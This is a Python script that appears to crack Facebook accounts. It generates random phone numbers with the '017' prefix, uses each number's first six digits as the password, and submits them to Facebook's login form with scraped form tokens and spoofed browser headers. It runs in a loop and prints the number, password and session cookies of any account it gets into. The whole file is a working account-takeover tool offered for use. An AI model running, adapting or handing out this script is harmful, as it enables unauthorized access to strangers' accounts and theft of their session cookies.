from bs4 import BeautifulSoup as bs
import requests as rs
import time , os
import random



num_iterations = int(input("Enter the number of times to run: "))

def main():
  random_number = random.randint(10000000, 99999999)
  uid = f'017{random_number}'
  pasw = uid[:6]
  
  email=str(uid)
  pwd=str(pasw)
  headers = {
    'Host': 'www.facebook.com',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Linux"',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'https://www.facebook.com',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://www.facebook.com/',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-GB,en;q=0.9',}

  resp = rs.get("https://www.facebook.com/",headers=headers)
  soup=bs(resp.content,"html.parser")
  form = soup.find('form',action=True,method="post")
  url = 'https://www.facebook.com'+form["action"]
  name="jazoest"
  jazoest = form.find('input',{'name':'jazoest'})['value']
  lsd = form.find('input',{'name':'lsd'})['value']
  _js_datr=resp.text.split('_js_datr","')[1].split('"')[0]
  cookies= resp.cookies.get_dict()
  cookies_final= {"_js_datr":_js_datr,"wd":"873x850","dpr":"1.100000023841858"}
  cookies_final.update(cookies)
  body={"jazoest":jazoest,"lsd":lsd,"email":email,"login_source":"comet_headerless_login","next":"","encpass":f"#PWD_BROWSER:0:{round(time.time())}:{pwd}"}
  resp = rs.post(url,cookies=cookies_final,headers=headers,data=body,allow_redirects=False)
  cookies.update(resp.cookies.get_dict())

  cookie_list= [f"{key}={value}" for key,value in cookies.items()]
  cookies = "; ".join(cookie_list)
  if "c_user" in cookies:
   print(" \033[1;37m[\033[1;33m•\033[0m\033[1;37m] \033[1;37mArxic-[\033[1;33mOK\033[0m]\033[0m")
   print(" \033[1;37m[\033[1;33mN\033[0m\033[1;37m] \033[1;37mNumber\033[1;31m:\033[0m",email)
   print(" \033[1;37m[\033[1;33mP\033[0m\033[1;37m] \033[1;37mPassword\033[1;31m:\033[0m",pwd)
   print(" \033[1;37m[\033[1;33mC\033[0m\033[1;37m] \033[1;37mCOOKIE\033[1;31m:\033[0m\033[1;33m ",cookies,"\033[0m\n")
 # else:
#    print(" \033[1;37m[\033[1;31m•\033[0m\033[1;37m] \033[1;37mArxic-[\033[1;31mInvalid\033[0m] \033[0m")
#    print(" \033[1;37m[\033[1;33mN\033[0m\033[1;37m] \033[1;37mNumber\033[1;31m:\033[0m",email)
#    print(" \033[1;37m[\033[1;33mP\033[0m\033[1;37m] \033[1;37mPassword\033[1;31m:\033[0m",pwd)
#    print(" \033[1;37m[\033[1;33mC\033[0m\033[1;37m] \033[1;37mCOOKIE\033[1;31m:\033[0m[\033[1;31mNO Cookies\033[0m]\n")


main()


# Loop and print the current iteration
for i in range(0, num_iterations + 1):
    # Format the iteration number with leading zeros
    main()
    formatted_iteration = f"[{i:03d}]"
    print(formatted_iteration)
    